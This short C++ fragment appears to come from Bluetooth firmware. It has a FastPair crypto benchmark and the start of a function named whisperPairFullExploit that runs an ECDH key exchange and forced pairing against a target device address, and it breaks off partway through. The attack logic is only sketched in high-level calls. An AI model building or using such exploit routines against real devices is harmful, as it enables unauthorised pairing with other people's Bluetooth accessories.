...
void fastpair_benchmark() {
    ...
    padprintln("Testing FastPair crypto...");
    padprintln("");
    
    crypto.benchmark();
    
    padprintln("");
    padprintln("Benchmark complete!");
}

bool whisperPairFullExploit(NimBLEAddress target) {
    uint8_t shared_secret[32];
    
    if(!fastpair_ecdh_key_exchange(target, shared_secret)) {
        return false;
    }
    
    if(!fastpair_complete_pairing(target, shared_secret)) {
        return false;
    }
